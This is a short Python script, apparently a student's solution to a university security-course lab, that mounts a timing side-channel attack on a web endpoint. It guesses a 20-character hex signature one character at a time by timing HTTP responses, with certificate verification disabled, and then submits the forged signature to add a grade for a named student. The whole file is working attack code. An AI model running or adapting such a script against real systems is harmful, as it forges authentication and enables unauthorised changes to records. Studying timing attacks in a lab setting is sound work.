#hej
import requests
requests.packages.urllib3.disable_warnings()
import hashlib
import binascii
import timeit

def genValidSign(name, grade):
    foundRightChar = [None]*20
    signString= ''
    for y in range(20):
        bestTime = 0
        for i in range(16):
            temp = signString + intToHex(i)
            payload={'name' : name, 'grade': grade,  'signature': temp}
            r = requests.get('https://eitn41.eit.lth.se:3119/ha4/addgrade.php', params=payload, verify = False)
            time = r.elapsed.total_seconds()
            if time > bestTime:
                bestTime = time
                foundRightChar[y] = intToHex(i)
        signString = signString + foundRightChar[y]
    signature = signString
    print(signature)
    payload={'grade': grade, 'name' : name, 'signature': signature}
    r = requests.get('https://eitn41.eit.lth.se:3119/ha4/addgrade.php', params=payload, verify = False)
    print('r: ', r.text.strip())
    if int(r.text.strip()) == 1:
        return signature
    else:
        return "We fucked up"

def ListToString(list):
    size = len(list)
    string = ''
    for i in range(size):
        string = string + list[i]
    return string

def intToHex(i):
    n = format(i,'01x')
    return n

print(genValidSign('Anna', '4'))
